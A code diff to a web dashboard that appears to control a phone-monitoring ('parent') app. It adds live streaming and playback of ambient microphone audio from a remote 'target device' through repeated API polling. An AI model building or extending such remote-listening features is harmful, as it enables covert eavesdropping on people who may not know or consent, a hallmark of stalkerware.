@@ -1605,21 +1605,29 @@
         a.click();
     }
 
-    // ─── Mic streaming via HTTP polling ──────────────────────────────────
+    let lastAudioSeq = 0;
+    let liveAudioStreamPolling = null;
+
+    // ─── Mic streaming via HTTP polling with Live Audio Playback ─────────
     function startMicStream(commandId) {
         stopMicStream();
         cmdMicElapsed = 0;
+        lastAudioSeq = 0;
         let totalDuration = 30;
 
-        document.getElementById('cmdResultSub').textContent = '🎙️ Recording mic continuously (30s)…';
+        startAudioPlayback();
+
+        document.getElementById('cmdResultSub').textContent = '🎙️ Live Ambient Mic Streaming & Recording…';
         document.getElementById('cmdResultBody').innerHTML = `
             <div class="cmd-mic-result">
                 <div class="mic-waveform" id="micWaveform">
                     ${Array.from({length:12}, () => `<div class="mic-wave-bar" style="height:12px; opacity:0.6;"></div>`).join('')}
                 </div>
                 <div class="mic-timer" id="micTimer">00:30</div>
-                <div class="mic-status-line" id="micStatusLine">🎙️ Target phone is recording continuous mic audio…</div>
-                <button class="btn-stop-mic" onclick="stopMicEarly()">⏹ Stop Recording</button>
+                <div class="mic-status-line" id="micStatusLine">🔊 Listening to live ambient audio from target device…</div>
+                <div style="display:flex;gap:10px;justify-content:center;margin-top:10px;">
+                    <button class="btn-stop-mic" onclick="stopMicEarly()">⏹ Stop & Save</button>
+                </div>
             </div>`;
 
         // Waveform bar pulsing animation while recording
@@ -1645,15 +1653,39 @@
 
             if (remain <= 0) {
                 const sl = document.getElementById('micStatusLine');
-                if (sl) sl.textContent = '⏳ Uploading 30s audio recording…';
+                if (sl) sl.textContent = '⏳ Finalizing audio recording…';
             }
         }, 1000);
 
-        // Poll command status for completed audio file upload
+        // 1. Live chunk polling loop (plays incoming audio live via Web Audio API)
+        liveAudioStreamPolling = setInterval(async () => {
+            try {
+                const pollRes = await fetchWithAuth(`/api/parent/commands/${DEVICE_ID}/audio-poll/${commandId}?since_seq=${lastAudioSeq}`);
+                if (!pollRes || !pollRes.ok) return;
+                const pollData = await pollRes.json();
+                if (pollData && pollData.has_chunks) {
+                    if (pollData.chunks && Array.isArray(pollData.chunks)) {
+                        for (const chunk of pollData.chunks) {
+                            if (chunk.seq > lastAudioSeq) {
+                                lastAudioSeq = chunk.seq;
+                                if (chunk.audio_b64) {
+                                    playAudioChunk({ audio: chunk.audio_b64, sample_rate: chunk.sample_rate });
+                                }
+                            }
+                        }
+                    } else if (pollData.audio_b64 && pollData.seq > lastAudioSeq) {
+                        lastAudioSeq = pollData.seq;
+                        playAudioChunk({ audio: pollData.audio_b64, sample_rate: pollData.sample_rate });
+                    }
+                }
+            } catch (_) {}
+        }, 350);
+
+        // 2. Poll command status for completed audio file upload
         let attempts = 0;
         cmdMicPollTimer = setInterval(async () => {
             attempts++;
-            if (attempts > 35) { // 70 seconds max timeout
+            if (attempts > 40) { // 80 seconds max timeout
                 stopMicStream();
                 clearInterval(waveAnimTimer);
                 showCmdError('Device did not return the audio recording in time.');
@@ -1674,6 +1706,12 @@
                 }
             } catch (e) { /* keep trying */ }
         }, 2000);
+    }
+
+    function stopMicStream() {
+        if (cmdMicElapsedTimer) { clearInterval(cmdMicElapsedTimer); cmdMicElapsedTimer = null; }
+        if (cmdMicPollTimer) { clearInterval(cmdMicPollTimer); cmdMicPollTimer = null; }
+        if (liveAudioStreamPolling) { clearInterval(liveAudioStreamPolling); liveAudioStreamPolling = null; }
     }
 
     let recAudioCtx = null;
